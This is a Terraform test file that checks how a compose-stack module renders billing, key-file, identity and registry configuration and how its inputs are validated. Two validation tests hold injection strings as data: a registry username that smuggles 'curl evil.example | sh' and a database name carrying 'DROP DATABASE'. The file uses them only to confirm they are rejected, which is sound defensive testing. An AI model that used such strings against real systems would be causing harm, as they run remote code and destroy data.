# Rendering tests for the compose-stack templates. `command = apply` is
# required because the templates interpolate random_password (unknown at plan
# time) — but the module's only resource IS that in-memory random string, so
# these tests create NOTHING outside the test process: no cloud account, no
# credentials, no network.
#
# Run from the module directory: terraform init && terraform test

variables {
  exchange_hostname = "exchange.staging.example"
  broker_hostname   = "broker.staging.example"
  identity_hostname = "mcp.staging.example"
  zitadel_hostname  = "login.staging.example"

  # The seat's domain, which IS the exchange hostname — a tenant row is the
  # Exchange seat (see the default-tenant test below).
  default_tenant_domain = "exchange.staging.example"

  exchange_image = "registry.example.com/group/proj/exchange:test"
  broker_image   = "registry.example.com/group/proj/broker:test"
  identity_image = "registry.example.com/group/proj/identity:test"

  acme_email = "ops@example.com"

  # Dummy key material — shape only, never used cryptographically. The broker
  # identity payload decodes to exactly 64 bytes because the variable's
  # validation counts them; the plain-English plaintext keeps the fixture
  # recognizably fake.
  ed25519_private_pem     = "-----BEGIN PRIVATE KEY-----\ndGVzdA==\n-----END PRIVATE KEY-----\n"
  rsa_private_pem         = "-----BEGIN RSA PRIVATE KEY-----\ndGVzdA==\n-----END RSA PRIVATE KEY-----\n"
  broker_relay_key_json   = "{\"kid\":\"broker.test.v1\"}"
  broker_identity_key_pem = "-----BEGIN ED25519 PRIVATE KEY-----\nZmFrZSBicm9rZXIgaWRlbnRpdHkgZml4dHVyZTogZXhhY3RseSBzaXh0eS1mb3VyIGJ5dGVzIGZvciB0ZnRlcw==\n-----END ED25519 PRIVATE KEY-----\n"
}

run "tigerbeetle_billing_wires_ledger_and_static_ip" {
  command = apply

  assert {
    condition     = strcontains(output.compose_yaml, "tigerbeetle:")
    error_message = "billing_adapter=tigerbeetle (default) must include the TigerBeetle service"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_BILLING_TB_ADDRESS: \"172.28.0.10:3000\"")
    error_message = "Exchange must point at TigerBeetle's static IP (the env var rejects hostnames)"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "ipv4_address: 172.28.0.10")
    error_message = "TigerBeetle must be pinned to the static IPAM address"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "FORA_BILLING_ADAPTER: \"tigerbeetle\"")
    error_message = "Exchange billing adapter env must carry the requested adapter"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_BILLING_LEDGER: \"978\"")
    error_message = "Exchange must carry the ledger currency — the tigerbeetle adapter refuses to boot without EXCHANGE_BILLING_LEDGER"
  }

  assert {
    condition     = length(regexall("- \"seccomp=unconfined\"", output.compose_yaml)) == 2
    error_message = "Both the tigerbeetle service AND the Exchange (embedded io_uring client) need the seccomp exception under Docker >= 25"
  }

  # Two, not three: the Identity Service is behind the same Caddy but only
  # SIGNS outbound FORA requests — it never verifies an inbound RFC 9421
  # signature, so it has no request target to reconstruct and nothing to
  # derive from X-Forwarded-Proto. Raise this count only for a service that
  # verifies inbound signatures.
  assert {
    condition     = length(regexall("FORA_TRUST_PROXY_HEADERS: \"true\"", output.compose_yaml)) == 2
    error_message = "Exchange AND Broker sit behind Caddy's TLS termination — both must trust X-Forwarded-Proto or signature verification runs against the plain-HTTP socket scheme"
  }
}

run "free_billing_drops_tigerbeetle" {
  command = apply

  variables {
    billing_adapter = "free"
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "tigerbeetle")
    error_message = "billing_adapter=free must not render any TigerBeetle service, address, or volume"
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "EXCHANGE_BILLING_LEDGER")
    error_message = "billing_adapter=free must not render the tigerbeetle-only ledger env var"
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "seccomp")
    error_message = "billing_adapter=free must not loosen seccomp on any service"
  }
}

run "unsupported_billing_ledger_is_rejected" {
  command = plan

  variables {
    billing_ledger = ["392"]
  }

  expect_failures = [var.billing_ledger]
}

run "unsupported_billing_ledger_in_a_list_is_rejected" {
  command = plan

  # One good code does not excuse a bad one: the Exchange refuses the whole set
  # at boot, so the validation refuses the whole list at plan.
  variables {
    billing_ledger = ["978", "392"]
  }

  expect_failures = [var.billing_ledger]
}

run "duplicate_billing_ledger_is_rejected" {
  command = plan

  variables {
    billing_ledger = ["978", "978"]
  }

  expect_failures = [var.billing_ledger]
}

run "empty_billing_ledger_is_rejected" {
  command = plan

  variables {
    billing_ledger = []
  }

  expect_failures = [var.billing_ledger]
}

run "single_billing_ledger_renders_as_before" {
  command = apply

  # The module default is EUR only, and it must still render as the bare "978"
  # a single-currency deployment has always had — no trailing comma, no list
  # syntax leaking into the env value.
  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_BILLING_LEDGER: \"978\"")
    error_message = "The default single-currency ledger must render as 978"
  }
}

run "two_billing_ledgers_render_comma_separated_in_order" {
  command = apply

  variables {
    billing_ledger = ["978", "840"]
  }

  # The list order reaches the Exchange verbatim, and the Exchange advertises
  # the first entry as base_currency. A renderer that sorted or deduplicated
  # the list would silently change what production advertises, so the exact
  # string is asserted.
  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_BILLING_LEDGER: \"978,840\"")
    error_message = "Two currencies must render comma-separated in the configured order (EUR first)"
  }
}

run "reordered_billing_ledgers_render_in_that_order" {
  command = apply

  variables {
    billing_ledger = ["840", "978"]
  }

  # The mirror of the case above: putting USD first renders USD first, which is
  # what makes a reorder a deliberate change to the advertised base_currency
  # rather than something the module normalizes away.
  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_BILLING_LEDGER: \"840,978\"")
    error_message = "A reordered ledger list must reach the Exchange in that order"
  }
}

run "production_posture_env_wiring" {
  command = apply

  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_PUBLIC_ORIGIN: \"https://exchange.staging.example\"")
    error_message = "Exchange public origin must be the https service hostname"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_BROKER_WELLKNOWN_URL: \"https://broker.staging.example/.well-known/fora.json\"")
    error_message = "Exchange must point at the Broker's public well-known URL (fail-closed revocation authority)"
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "SKIP_SSRF") && !strcontains(output.compose_yaml, "ALLOW_INSECURE")
    error_message = "The compose-network-only insecure overrides must never appear in the staging bundle"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "BROKER_DOMAIN: \"broker.staging.example\"")
    error_message = "Broker domain must be the public hostname"
  }
}

run "broker_identity_key_is_persistent_not_ephemeral" {
  command = apply

  assert {
    condition     = strcontains(output.compose_yaml, "BROKER_ED25519_KEY_FILE: \"/keys/broker-identity-key.pem\"")
    error_message = "The Broker refuses to boot without an identity key — the key file must be wired into its environment"
  }

  # The key travels as a root-owned file under the per-service key directory,
  # like every other private key. Both the path AND the body are asserted in
  # user_data: the path alone would stay green if the content interpolation
  # were dropped, shipping an empty key file.
  assert {
    condition     = strcontains(output.user_data, "/opt/fora/keys/broker/broker-identity-key.pem") && strcontains(output.user_data, "ZmFrZSBicm9rZXIgaWRlbnRpdHkgZml4dHVyZTogZXhhY3RseSBzaXh0eS1mb3VyIGJ5dGVzIGZvciB0ZnRlcw==")
    error_message = "The identity key — path and content — must land in the Broker's key directory via cloud-init"
  }

  # The rendered compose file is world-readable on the VM, so neither the seed
  # env var nor the PEM body may appear in it. "BROKER_ED25519_SEED:" with the
  # trailing colon — the env-key form — because a template comment legitimately
  # names the variable in prose when explaining why it is NOT used.
  assert {
    condition     = !strcontains(output.compose_yaml, "BROKER_ED25519_SEED:") && !strcontains(output.compose_yaml, "ZmFrZSBicm9rZXIgaWRlbnRpdHkgZml4dHVyZTogZXhhY3RseSBzaXh0eS1mb3VyIGJ5dGVzIGZvciB0ZnRlcw==")
    error_message = "No identity key material in the compose file — it is written world-readable on the VM; the key ships only as the 0640 root:65532 key file"
  }

  # The opt-out exists for development and CI. Under it the Broker mints a new
  # identity on every restart while still publishing a 90-day validity window
  # for it in its WBA directory, so a staging stack on a public hostname must
  # never render it.
  assert {
    condition     = !strcontains(output.compose_yaml, "BROKER_ALLOW_EPHEMERAL_KEY")
    error_message = "The ephemeral-key opt-out must never appear in the staging bundle"
  }

  # Distinct keys, distinct files. Equal values would mean one identity doing
  # both jobs, which is not what either loader expects.
  assert {
    condition     = strcontains(output.compose_yaml, "BROKER_RELAY_KEY_FILE: \"/keys/broker-relay-key.json\"")
    error_message = "The relay key must still be delivered as its own mounted file, separate from the identity key"
  }
}

run "non_pem_broker_identity_key_is_rejected" {
  command = plan

  variables {
    # The seed shape the variable used to take — a paste-through of the old
    # value must fail the plan, not crash-loop the Broker on a non-PEM file.
    broker_identity_key_pem = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
  }

  expect_failures = [
    var.broker_identity_key_pem,
  ]
}

run "openssl_pkcs8_broker_identity_key_is_rejected" {
  command = plan

  variables {
    # The MOST LIKELY wrong file: `openssl genpkey -algorithm ED25519` output.
    # Its label lacks ED25519 and its PKCS#8 payload is 48 bytes, not 64 — the
    # Broker's loader rejects it at runtime, so the plan must reject it first.
    # (Payload here is a structurally real 48-byte PKCS#8 shape.)
    broker_identity_key_pem = "-----BEGIN PRIVATE KEY-----\nMC4CAQAwBQYDK2VwBCIEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n-----END PRIVATE KEY-----\n"
  }

  expect_failures = [
    var.broker_identity_key_pem,
  ]
}

run "truncated_broker_identity_key_is_rejected" {
  command = plan

  variables {
    # Right label, short payload — an interrupted copy-paste. The 88-character
    # count check has to catch what the label check cannot.
    broker_identity_key_pem = "-----BEGIN ED25519 PRIVATE KEY-----\nZmFrZSBicm9rZXIgaWRlbnRpdHkgZml4dHVyZQ==\n-----END ED25519 PRIVATE KEY-----\n"
  }

  expect_failures = [
    var.broker_identity_key_pem,
  ]
}

run "default_tenant_is_the_exchange_seat" {
  command = apply

  # A tenant row is the Exchange seat, keyed on the Exchange's own hostname, so
  # this renders the same value as EXCHANGE_DOMAIN. Register reads its
  # activation policy from the seat the seed step creates.
  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_DEFAULT_TENANT: \"exchange.staging.example\"")
    error_message = "Register reads its activation policy from the seat the seed step creates, which is under the Exchange's own hostname"
  }

  # A publisher hostname is not a tenant. Left pointing at one — the way this
  # value read while a tenant meant a publisher — it matches no tenant row, so
  # every Register fails and no agent ever gets a billing_ref to be charged
  # against. An empty value renders nothing at all and is caught below.
  assert {
    condition     = !strcontains(output.compose_yaml, "EXCHANGE_DEFAULT_TENANT: \"\"") && !strcontains(output.compose_yaml, "EXCHANGE_DEFAULT_TENANT: \"demo.staging.example\"")
    error_message = "An empty default tenant, or a publisher hostname in its place, matches no seat row"
  }
}

run "empty_default_tenant_is_rejected" {
  command = plan

  # "" is the same as unset: the binary treats an empty env var as absent and
  # falls back to EXCHANGE_DOMAIN. That fallback is the right value now, which
  # is why the empty string is still refused — it leaves the rendered compose
  # file stating no seat, so the seed step has nothing to read back and the two
  # are free to disagree. The render assert above cannot catch this (the fixture
  # always supplies a value), so the variable's own validation has to.
  variables {
    default_tenant_domain = ""
  }

  expect_failures = [
    var.default_tenant_domain,
  ]
}

run "default_agent_credit_disabled_by_default" {
  command = apply

  # The variable's default must render as the empty value the binary treats as
  # disabled — a freshly applied stack grants nothing until the operator opts in.
  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_DEFAULT_AGENT_CREDIT: \"\"")
    error_message = "The welcome credit must render disabled (empty) unless the stack opts in"
  }
}

run "default_agent_credit_renders_when_configured" {
  command = apply

  variables {
    billing_ledger       = ["978", "840"]
    default_agent_credit = "EUR=100,USD=9.99"
  }

  # "EUR=100" means EUR 100.00, not 100 minor units — the value passes through
  # verbatim and the Exchange does the scale-8 conversion per currency.
  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_DEFAULT_AGENT_CREDIT: \"EUR=100,USD=9.99\"")
    error_message = "The configured per-currency welcome credit must reach the Exchange env verbatim"
  }
}

run "malformed_default_agent_credit_is_rejected" {
  command = plan

  # A negative amount would stop the Exchange boot at apply time; the variable
  # validation moves that failure to plan.
  variables {
    default_agent_credit = "EUR=-100"
  }

  expect_failures = [
    var.default_agent_credit,
  ]
}

run "bare_number_default_agent_credit_is_rejected" {
  command = plan

  # The single-currency format this variable used to take. The Exchange can no
  # longer tell which currency it means, so it stops the boot — and the
  # validation stops the plan, which is where an operator who missed the format
  # change will actually see it.
  variables {
    default_agent_credit = "100"
  }

  expect_failures = [
    var.default_agent_credit,
  ]
}

run "lowercase_currency_default_agent_credit_is_rejected" {
  command = plan

  variables {
    default_agent_credit = "eur=100"
  }

  expect_failures = [
    var.default_agent_credit,
  ]
}

run "sor_database_is_created_unconditionally" {
  command = apply

  assert {
    condition     = strcontains(output.user_data, "CREATE DATABASE sor;")
    error_message = "The Exchange's System of Record owns a separate database and migrates but never creates it — the module must create it whether or not the caller sets extra_databases"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "postgres:5432/sor?sslmode=disable")
    error_message = "EXCHANGE_SOR_DSN must point at that database — FORA_SOR_ADAPTER defaults to postgres and has no 'off', so an unset DSN fails the boot"
  }

  # The SoR is a SECOND pool. Pointing both at `fora` would run the SoR
  # migrations into the Exchange's own database, which is not the contract the
  # adapter documents.
  assert {
    condition     = length(regexall("EXCHANGE_SOR_DSN: \"[^\"]*/fora\\?sslmode=disable\"", output.compose_yaml)) == 0
    error_message = "The SoR DSN must address its own database, not the shared fora one"
  }
}

run "publisher_origin_is_optional" {
  command = apply

  assert {
    condition     = !strcontains(output.compose_yaml, "publisher:")
    error_message = "No origin_hostname -> no publisher service in the bundle"
  }
}

run "publisher_origin_renders_when_configured" {
  command = apply

  variables {
    origin_hostname = "origin.staging.example"
    publisher_image = "registry.example.com/group/proj/publisher:test"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "publisher:")
    error_message = "origin_hostname set -> publisher service must be in the bundle"
  }

  assert {
    condition     = strcontains(output.user_data, "origin.staging.example")
    error_message = "Caddy must get a site block for the origin hostname"
  }
}

run "registry_login_only_with_credentials" {
  command = apply

  assert {
    condition     = !strcontains(output.user_data, "docker login")
    error_message = "No registry credentials -> first boot must not run docker login"
  }
}

run "registry_login_renders_with_credentials" {
  command = apply

  variables {
    registry_server   = "registry.example.com"
    registry_username = "deploy-token-user"
    registry_password = "deploy-token-secret"
  }

  assert {
    condition     = strcontains(output.user_data, "docker login registry.example.com")
    error_message = "Registry credentials set -> first boot must log in before compose up"
  }

  assert {
    condition     = !strcontains(output.user_data, "deploy-token-secret")
    error_message = "The raw registry password must never appear in user data — only its base64 file content"
  }

  assert {
    condition     = strcontains(output.user_data, "--password-stdin < /opt/fora/.registry-password")
    error_message = "docker login must read the password from the root-only file, not a command-line argument"
  }
}

run "key_material_lands_in_cloud_init" {
  command = apply

  assert {
    condition     = strcontains(output.user_data, "-----BEGIN PRIVATE KEY-----")
    error_message = "Ed25519 PEM must be written to the VM via cloud-init"
  }

  assert {
    condition     = strcontains(output.user_data, "/opt/fora/keys/exchange/rsa-private.pem")
    error_message = "RSA PEM file must be written when rsa_private_pem is set"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "FORA_RSA_PRIVATE_PEM_FILE")
    error_message = "Exchange must reference the RSA key file when rsa_private_pem is set"
  }

  assert {
    condition     = strcontains(output.user_data, "chown -R root:65532 /opt/fora/keys") && strcontains(output.user_data, "-type f -exec chmod 0640")
    error_message = "Keys must be re-owned root:65532 and opened to 0640 before compose starts — group read for the nonroot services, nothing for other local users"
  }

  assert {
    condition     = !strcontains(output.user_data, "permissions: \"0644\"\n    content: |\n      -----BEGIN")
    error_message = "Key files must not be written world-readable"
  }

  assert {
    condition     = strcontains(output.user_data, "/opt/fora/keys/exchange/ed25519-private.pem") && strcontains(output.user_data, "/opt/fora/keys/broker/broker-relay-key.json")
    error_message = "Each private key must land in its own service's directory"
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "- /opt/fora/keys:/keys:ro")
    error_message = "No container may mount the whole keys tree — each service gets only its own key directory, so a compromise of one does not expose another's signing identity"
  }
}

run "rsa_key_renders_when_supplied" {
  command = apply

  assert {
    condition     = strcontains(output.compose_yaml, "FORA_RSA_PRIVATE_PEM_FILE: \"/keys/rsa-private.pem\"")
    error_message = "A supplied RSA key must reach the Exchange, or a CloudFront tenant cannot be served"
  }

  assert {
    condition     = strcontains(output.user_data, "/opt/fora/keys/exchange/rsa-private.pem")
    error_message = "A supplied RSA key must be written to the VM, or the env var above points at nothing"
  }
}

run "rsa_key_is_optional" {
  command = apply

  # The Exchange needs an RSA key only for AWS_CLOUDFRONT_RSA tenants. It starts
  # without one and refuses just the requests that would need it, naming the
  # setting to add — so a stack whose every tenant is on the ED25519 scheme must
  # not be forced to generate and mount a key nothing reads.
  variables {
    rsa_private_pem = null
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "FORA_RSA_PRIVATE_PEM_FILE")
    error_message = "No rsa_private_pem -> the Exchange must not be pointed at an RSA key file that was never written"
  }

  assert {
    condition     = !strcontains(output.user_data, "rsa-private.pem")
    error_message = "No rsa_private_pem -> no RSA key file on the VM"
  }

  # The Ed25519 key is a different matter: every tenant signs offers with it, so
  # it must still be there.
  assert {
    condition     = strcontains(output.compose_yaml, "FORA_ED25519_PRIVATE_PEM_FILE: \"/keys/ed25519-private.pem\"")
    error_message = "The Ed25519 key stays mandatory — dropping the RSA requirement must not loosen that one"
  }
}

run "acme_staging_toggle" {
  command = apply

  variables {
    acme_staging = true
  }

  assert {
    condition     = strcontains(output.user_data, "acme-staging-v02.api.letsencrypt.org")
    error_message = "acme_staging=true must switch Caddy to the Let's Encrypt staging CA"
  }
}

run "acme_production_by_default" {
  command = apply

  assert {
    condition     = !strcontains(output.user_data, "acme-staging-v02")
    error_message = "acme_staging defaults off -> no staging CA in the Caddyfile"
  }
}

# The static Web Bot Auth key directories are tested in
# static_wba_unit_test.tftest.hcl.

run "extra_databases_render_in_init_sql" {
  command = apply

  variables {
    extra_databases = ["fora_b", "fora_c"]
  }

  assert {
    condition     = strcontains(output.user_data, "CREATE DATABASE fora_b;") && strcontains(output.user_data, "CREATE DATABASE fora_c;")
    error_message = "extra_databases must become CREATE DATABASE statements in the init SQL"
  }
}

run "identity_database_is_created_unconditionally" {
  command = apply

  assert {
    condition     = strcontains(output.user_data, "CREATE DATABASE identity;")
    error_message = "The Identity Service owns a separate database — the module must create it whether or not the caller sets extra_databases"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "postgres:5432/identity?sslmode=disable")
    error_message = "IDENTITY_DSN must point at that database, not the shared fora one"
  }
}

run "identity_plane_is_wired" {
  command = apply

  assert {
    condition = alltrue([
      for svc in ["identity:", "identity-vault:", "zitadel:", "zitadel-db:"] :
      strcontains(output.compose_yaml, svc)
    ])
    error_message = "The identity plane is an unconditional part of the bundle: service, key store, OIDC provider, and its database"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "IDENTITY_BASE_DOMAIN: \"mcp.staging.example\"") && strcontains(output.compose_yaml, "IDENTITY_AUTH_ISSUER: \"https://mcp.staging.example\"")
    error_message = "The service's own zone and issuer must both be its public hostname — agent directories hang off the first, the registered OAuth redirect URI off the second"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "IDENTITY_OIDC_ISSUER: \"https://login.staging.example\"")
    error_message = "The upstream OIDC issuer must be Zitadel's PUBLIC URL — a compose-network address would not match what the developer's browser is redirected to"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "IDENTITY_MCP_BROKER_URL: \"http://broker:8082\"")
    error_message = "Discovery is an in-network hop to the Broker"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "IDENTITY_MCP_EXCHANGE_ALLOWLIST: \"exchange.staging.example\"") && strcontains(output.compose_yaml, "\n      EXCHANGE_DOMAIN: \"exchange.staging.example\"")
    error_message = "The Exchange policy names the identity the Exchange publishes about itself, which is the value an agent names in a tool call and the value that Exchange answers to"
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "IDENTITY_MCP_EXCHANGE_URL") && !strcontains(output.compose_yaml, "IDENTITY_MCP_EXCHANGE_DOMAIN")
    error_message = "No Exchange origin is configured: an account call names its Exchange per call and resolves the endpoint from that Exchange's own manifest, so a rendered origin would be a setting nothing reads"
  }

  assert {
    condition     = strcontains(output.user_data, "reverse_proxy identity:8083") && strcontains(output.user_data, "reverse_proxy zitadel:8080")
    error_message = "Caddy must front both the Identity Service and Zitadel"
  }

  assert {
    condition     = strcontains(output.user_data, "*.mcp.staging.example") && strcontains(output.user_data, "on_demand")
    error_message = "Agent directory subdomains do not exist until sign-up, so the wildcard site must issue certificates on demand"
  }

  assert {
    condition     = strcontains(output.user_data, "ask http://identity:8083/healthz")
    error_message = "on-demand issuance without an ask endpoint would attempt a certificate for any name presented in SNI"
  }
}

run "identity_secrets_are_generated_not_ephemeral" {
  command = apply

  assert {
    condition     = strcontains(output.compose_yaml, "IDENTITY_SESSION_KEY: ") && strcontains(output.compose_yaml, "IDENTITY_TOKEN_SIGNING_KEY: ")
    error_message = "Both must be set explicitly: left unset the service invents them per boot and every live session and issued bearer dies on restart"
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "IDENTITY_SESSION_KEY: \"\"") && !strcontains(output.compose_yaml, "IDENTITY_TOKEN_SIGNING_KEY: \"\"")
    error_message = "An empty value is the same as unset — the service would fall back to an ephemeral key"
  }

  assert {
    condition     = length(nonsensitive(output.zitadel_admin_password)) >= 24
    error_message = "The Zitadel console admin password must be generated, not the published laptop-fixture default"
  }

  assert {
    condition     = !strcontains(output.user_data, "ZAdmin123!")
    error_message = "deploy/zitadel/init-steps.yaml is a laptop fixture with a password published in the repository — the staging instance is internet-reachable and must not inherit it"
  }
}

run "invalid_billing_adapter_is_rejected" {
  command = plan

  variables {
    billing_adapter = "stripe"
  }

  expect_failures = [
    var.billing_adapter,
  ]
}

run "origin_without_publisher_image_is_rejected" {
  command = plan

  variables {
    origin_hostname = "origin.staging.example"
  }

  expect_failures = [
    random_password.postgres,
  ]
}

run "shell_shaped_registry_username_is_rejected" {
  command = plan

  variables {
    registry_server   = "registry.example.com"
    registry_username = "user'; curl evil.example | sh #"
    registry_password = "token"
  }

  expect_failures = [
    var.registry_username,
  ]
}

run "sql_shaped_extra_database_is_rejected" {
  command = plan

  variables {
    extra_databases = ["fora_b; DROP DATABASE fora"]
  }

  expect_failures = [
    var.extra_databases,
  ]
}

run "undersized_network_subnet_is_rejected" {
  command = plan

  variables {
    network_subnet = "not-a-cidr"
  }

  expect_failures = [
    var.network_subnet,
  ]
}

run "registry_server_without_credentials_is_rejected" {
  command = plan

  variables {
    registry_server = "registry.example.com"
  }

  expect_failures = [
    random_password.postgres,
  ]
}

run "registry_credentials_without_server_are_rejected" {
  command = plan

  variables {
    registry_username = "deploy-token-user"
    registry_password = "token"
  }

  expect_failures = [
    random_password.postgres,
  ]
}

# The two operator-facing surfaces an evidence read needs: the Exchange admin
# listener over HTTP, and the Postgres cluster. Both are published so that an
# `ssh -L` to the VM reaches them, and both must stay bound to loopback.
#
# network_subnet is overridden away from its default here on purpose. That is
# what proves ADMIN_ALLOWED_CIDRS is interpolated from the variable, rather
# than written out as a literal that happens to match the default.
run "operator_surfaces_bind_loopback_and_allow_the_compose_subnet" {
  command = apply

  variables {
    network_subnet = "10.99.7.0/24"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "ADMIN_ALLOWED_CIDRS: \"10.99.7.0/24\"")
    error_message = "ADMIN_ALLOWED_CIDRS must be interpolated from network_subnet. An empty or stale value answers 403 to every admin call: the allowlist middleware is fail-closed, and it reads RemoteAddr — which a published port rewrites to the compose network's gateway — never X-Forwarded-For."
  }

  assert {
    condition     = strcontains(output.compose_yaml, "- \"127.0.0.1:8082:8082\"")
    error_message = "The Exchange admin listener must be published on the VM's loopback interface, or an SSH tunnel to the VM reaches nothing."
  }

  assert {
    condition     = strcontains(output.compose_yaml, "- \"127.0.0.1:5432:5432\"")
    error_message = "Postgres must be published on the VM's loopback interface, or an SSH tunnel to the VM reaches nothing."
  }

  # Count every publish of container port 8082 or 5432, then require all of
  # them to carry the 127.0.0.1 bind address. Dropping the prefix
  # ("8082:8082") or widening it ("0.0.0.0:8082:8082") makes the two counts
  # differ. Caddy's 80 and 443 are deliberately wildcard-bound, and this
  # regex does not match them.
  assert {
    condition     = length(regexall("- \"[0-9.:]*(?:8082|5432):(?:8082|5432)\"", output.compose_yaml)) == length(regexall("- \"127\\.0\\.0\\.1:(?:8082|5432):(?:8082|5432)\"", output.compose_yaml))
    error_message = "The admin listener has no login of any kind — only the source-address allowlist — so neither it nor Postgres may be published on a wildcard address."
  }
}
